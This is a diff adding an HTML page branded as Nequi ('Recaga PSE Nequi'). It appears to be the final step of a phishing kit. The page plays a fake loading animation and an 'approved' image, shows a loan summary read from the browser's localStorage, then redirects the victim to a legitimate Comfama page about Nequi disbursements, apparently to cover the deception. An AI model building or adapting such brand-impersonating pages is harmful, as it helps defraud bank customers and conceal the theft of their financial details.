@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Recaga PSE Nequi</title>
+  <meta http-equiv="content-type" content="text/html; utf-8">
+  <meta charset="utf-8">
+  <meta content="es" http-equiv="Content-Language">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <meta name="Copyright" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="theme-color" content="#11A6BB">
+  <link rel="icon" type="image/svg+xml" sizes="32x32" href="../../../assets/img/nequi-favicon-dark.svg" media="(prefers-color-scheme: dark)">
+  <link rel="icon" type="image/svg+xml" sizes="32x32" href="../../../assets/img/nequi-favicon-light.svg" media="(prefers-color-scheme: light)">
+  <script type="text/javascript" src="../../../assets/js/jquery-3.6.0.min.js"></script>
+  <link href="../../../assets/css/styles.css" rel="stylesheet">
+  <script type="text/javascript" src="../../../assets/js/functions.js"></script>
+  <script type="text/javascript" src="../../../assets/js/ready.js"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200;300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <script type="text/javascript">
+    $(document).ready(function(){
+      // Llamadas iniciales (si se requieren)
+      cargar_resumen();
+      setTimeout(vista_resumen, 1600);
+      
+      // Ocultar inicialmente el contenedor de la factura y la imagen aprobada
+      $("#factura-container").hide();
+      $("#aprobado").hide();
+      
+      // Después de 2 segundos, ocultamos el GIF y mostramos la imagen aprobada
+      setTimeout(function(){
+        $("#cargando").hide();
+        $("#aprobado").fadeIn();
+        
+        // Después de otros 2 segundos, ocultamos la imagen aprobada y mostramos la factura
+        setTimeout(function(){
+          $("#aprobado").fadeOut(function(){
+            $("#factura-container").fadeIn(function(){
+              // Una vez mostrada la factura, esperamos 5 segundos y redirigimos
+              setTimeout(function(){
+                window.location.href = "https://www.comfama.com/ayuda/creditos-y-finanzas/creditos/desembolso-nequi-daviplata-a-la-mano";
+              }, 5000);
+            });
+            // Rellenamos los datos de la factura desde localStorage (objeto "inicio")
+            const inicio = JSON.parse(localStorage.getItem('inicio'));
+            if(inicio){
+              $("#monto").text(inicio.monto);
+              $("#plazo").text(inicio.plazo + " meses");
+              $("#cuota").text(inicio.cuota);
+              $("#interesTotal").text(inicio.interesTotal);
+              $("#montoTotal").text(inicio.montoTotal);
+            } else {
+              $("#factura-container").append('<p style="text-align:center; color:red;">No se encontraron datos guardados.</p>');
+            }
+          });
+        }, 2000);
+      }, 2000);
+    });
+  </script>
+  <style type="text/css">
+    /* Fondo blanco sólido */
+    #fondo {
+      position: fixed;
+      z-index: 300;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      background-color: #fff;
+    }
+    /* GIF de carga, centrado y por encima de todo */
+    #cargando {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 320;
+    }
+    /* Contenedor de la factura */
+    #factura-container {
+      display: none;
+      width: 90%;         /* Deja márgenes laterales */
+      max-width: 600px;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      border: 1px solid #ccc;  /* Bordes para delimitar el contenido */
+      border-top: 4px solid #E0128B;
+      margin: 20px auto;
+      font-family: 'Manrope', sans-serif;
+      box-sizing: border-box;
+      position: relative;
+      z-index: 100;
+    }
+    #factura-container #logo {
+      width: 150px;
+      margin: 0 auto 20px auto;
+      display: block;
+    }
+    #factura-container h1 {
+      font-size: 26px;
+      text-align: center;
+      margin-bottom: 25px;
+      color: #E0128B;
+    }
+    #factura-container .detalle {
+      font-size: 16px;
+      margin-bottom: 10px;
+      display: flex;
+      justify-content: space-between;
+    }
+    #factura-container .detalle span {
+      font-weight: bold;
+    }
+    #factura-container .mensaje-final {
+      text-align: center;
+      margin-top: 25px;
+      font-style: italic;
+      color: #555;
+    }
+    /* Imagen aprobada: más pequeña y centrada */
+    #aprobado {
+      display: none;
+      margin: 20px auto;
+      width: 200px;      /* Ajusta este valor según necesites */
+      max-width: 90%;
+    }
+  </style>
+</head>
+<body>
+  <!-- Fondo blanco -->
+  <div id="fondo"></div>
+  <!-- GIF de carga -->
+  <img id="cargando" src="../../../assets/img/cargando.gif" width="180">
+  <!-- Imagen aprobada -->
+  <img src="../../../assets/img/aprobado.jpg" id="aprobado">
+  <!-- Contenedor de la factura -->
+  <div id="factura-container">
+    <img src="logo.png" alt="Logo" id="logo">
+    <h1>Gracias</h1>
+    <div class="detalle"><span>Monto solicitado:</span><span id="monto"></span></div>
+    <div class="detalle"><span>Plazo:</span><span id="plazo"></span></div>
+    <div class="detalle"><span>Cuota mensual:</span><span id="cuota"></span></div>
+    <div class="detalle"><span>Interés Total:</span><span id="interesTotal"></span></div>
+    <div class="detalle"><span>Monto Total a pagar:</span><span id="montoTotal"></span></div>
+    <p class="mensaje-final">Gracias por completar tu proceso. Te avisaremos cuando todo haya terminado.</p>
+  </div>
+</body>
+</html>
